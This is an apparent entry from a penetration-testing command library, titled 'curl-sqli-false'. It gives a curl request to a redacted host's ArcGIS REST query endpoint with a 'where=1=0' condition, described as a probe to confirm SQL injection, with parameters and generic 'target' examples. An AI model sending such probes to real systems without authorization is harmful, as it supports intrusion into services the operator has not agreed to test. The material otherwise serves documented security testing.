---
id: cmd-003
data: >-
  curl
  "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D0&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
tags:
  - sqli
  - validation
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.167Z'
verified: false
validated: true
submitted: true
---
# curl-sqli-false

## Command

```bash
curl "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D0&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
```

## Description

Injects '1=0' to confirm SQLi by expecting no records, validating parameter influence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| where=1%3D0 | URL-encoded false condition | Yes |
| f=html | Output format | Yes |
| --max-time | Timeout (optional) | No |

## Examples

### Basic Usage

```bash
curl "https://target/arcgis/.../query?where=1%3D0&f=html"
```

### Advanced Usage

```bash
curl --max-time 10 "https://target/arcgis/.../query?where=1%3D0&f=html"
```

## Expected Output

Empty HTML response or 'no features found' message.

## Related

- [[Related Procedure: Confirm-SQL-Injection-with-False-Condition]]
